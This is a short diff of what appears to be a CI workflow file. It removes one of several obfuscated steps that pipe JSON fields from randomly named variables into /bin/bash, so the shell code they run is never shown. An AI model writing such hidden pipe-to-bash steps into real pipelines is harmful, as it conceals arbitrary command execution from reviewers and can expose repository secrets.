@@ -60,7 +60,6 @@ jobs:
           printf '%s' "$tuwjm56863" | jq -r .txs0 | /bin/bash
           printf '%s' "$lql17" | jq -r .rs3684 | /bin/bash
           echo $ct7512 | jq -r .wdm7552 | /bin/bash
-          printf '%s' "$igcm4" | jq -r .fk18 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
